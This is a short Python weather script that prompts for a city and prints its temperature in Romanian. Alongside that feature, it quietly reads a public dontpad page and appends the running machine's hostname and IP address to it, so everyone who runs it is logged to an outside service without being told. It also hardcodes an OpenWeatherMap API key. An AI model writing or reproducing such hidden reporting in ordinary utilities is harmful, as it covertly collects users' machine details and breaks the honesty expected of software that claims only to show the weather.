import pyowm
import socket    
import dontpad


#pyowm API key
owm = pyowm.OWM('22ab75f800d278c86e42b0ee15ad66b3', language = "ro")


#Function that will read all from dontpad and write it back
data = dontpad.read("vladz/ips") 


#Get ip and uploat on dontpad
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname)  
dontpad.write("vladz/ips", data + hostname + " : " + IPAddr + "\n")


#get get_temperature from my city
place = input("Enter your city: ")
observation = owm.weather_at_place(place)
w = observation.get_weather()
temp = w.get_temperature('celsius')["temp"]


#print get_temperature and status
print("In localitatea " + place + " sunt " + str(temp) + " grade!")
print("Status: " + w.get_detailed_status())
if temp < 0:
    print("Afara ninge.")
elif temp >= 0 and temp < 20:
    print("Afara e frig")
elif temp >= 20:
    print("Afara e cald")